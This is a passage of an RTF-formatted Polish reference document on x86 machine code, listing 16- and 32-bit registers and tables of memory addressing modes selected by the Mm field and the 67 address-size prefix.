\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16-bitowe}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}AX}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}CX}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DX}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}BX}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SP}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}BP}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SI}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DI}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1118\clvertalt\cltxlrtb    \cellx2131\clvertalt\cltxlrtb    \cellx3144\clvertalt\cltxlrtb    \cellx4158\clvertalt\cltxlrtb    \cellx5171\clvertalt\cltxlrtb    \cellx6184\clvertalt\cltxlrtb    \cellx7197\clvertalt\cltxlrtb    \cellx8210\clvertalt\cltxlrtb    \cellx9224
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}32-bitowe}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EAX}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ECX}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDX}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EBX}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ESP}\cell{\*\abiendcell}{\*\abicellprops left-attach:6; right-attach:7; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EBP}\cell{\*\abiendcell}{\*\abicellprops left-attach:7; right-attach:8; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}ESI}\cell{\*\abiendcell}{\*\abicellprops left-attach:8; right-attach:9; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}EDI}\cell{\*\abiendcell}\row}{\*\abiendtable}\par
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Mem - okre\uc1\u347\'9cla adres w pami\uc1\u281\'eaci, na kt\'f3rym wykonywana jest operacja; spos\'f3b adresowania zale\uc1\u380\'bfy od obecno\uc1\u347\'9cci przedrostka 67 oraz od pola struktury MmRejMem, b\uc1\u281\'ead\uc1\u261\'b9cej drugim bajtem instrukcji. W zale\uc1\u380\'bfno\uc1\u347\'9cci od zawarto\uc1\u347\'9cci pola Mm zmienia si\uc1\u281\'ea wielko\uc1\u347\'9c\uc1\u263\'e6 offsetu dodawanego do odpowiednich rej}{\f1\fs24\lang1045{\*\listtag0}estr\'f3w (08 - ofset 8 bitowy, 016 - 16 bitowy, 032 - 32 bitowy).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Je\uc1\u380\'bfeli nie wyst\uc1\u261\'b9pi\uc1\u322\'b3 przedrostek 67, to u\uc1\u380\'bfywany jest nast\uc1\u281\'eapuj\uc1\u261\'b9cy spos\'f3b adresowania (16 - bitowy, Seg oznacza domy\uc1\u347\'9clny segment adresuj\uc1\u261\'b9cy dane, je\uc1\u380\'bfeli przed instrukcja nie wyst\uc1\u261\'b9pi\uc1\u322\'b3 przedrostek i}{\f1\fs24\lang1045{\*\listtag0}nnego segmentu):}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.0842in/0.7946in/0.8654in/1.2550in/1.2550in/1.2550in/; table-sdh:89e7968}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Mem}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Seg/Mm}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}10}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}11 - operacja na rejestrze o numerze Mam, a nie na pamieci}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+SI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+SI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+SI+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+DI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+DI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+DI+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}010}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BP+SI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BP+SI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BP+SI+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}011}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BP+DI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BP+DI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BP+DI+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}100}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[SI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[SI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[SI+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}101}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[DI]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[DI+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[DI+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}110}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS/SS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS:[O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS:[BP+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}SS:[BP+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3896\clvertalt\cltxlrtb    \cellx5703\clvertalt\cltxlrtb    \cellx7510\clvertalt\cltxlrtb    \cellx9317
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}111}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+O8]}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[BX+O16]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}\row}{\*\abiendtable}
\pard\plain\ltrpar\ql\itap0{\f3\fs20\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Je\uc1\u380\'bfeli wyst\uc1\u261\'b9pi\uc1\u322\'b3 przedrostek 67, to u\uc1\u380\'bfywany jest nast\uc1\u281\'eapuj\uc1\u261\'b9cy spos\'f3b adresowania (32-bitowy):}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:1.0842in/0.7946in/0.9293in/1.2335in/1.2335in/1.2335in/; table-sdh:89f2e80}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Mem}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Seg/Mm}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}10}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}11-operacja na rejestrze o numerze Mem, a nie na pami\uc1\u281\'eaci}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}000}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}DS}\cell{\*\abiendcell}{\*\abicellprops left-attach:2; right-attach:3; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EAX]}\cell{\*\abiendcell}{\*\abicellprops left-attach:3; right-attach:4; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EAX+O8\}}\cell{\*\abiendcell}{\*\abicellprops left-attach:4; right-attach:5; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}[EAX+O32]}\cell{\*\abiendcell}{\*\abicellprops left-attach:5; right-attach:6; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx1505\clvertalt\cltxlrtb    \cellx2649\clvertalt\cltxlrtb    \cellx3988\clvertalt\cltxlrtb    \cellx5764\clvertalt\cltxlrtb    \cellx7540\clvertalt\cltxlrtb    \cellx9316
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}001}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
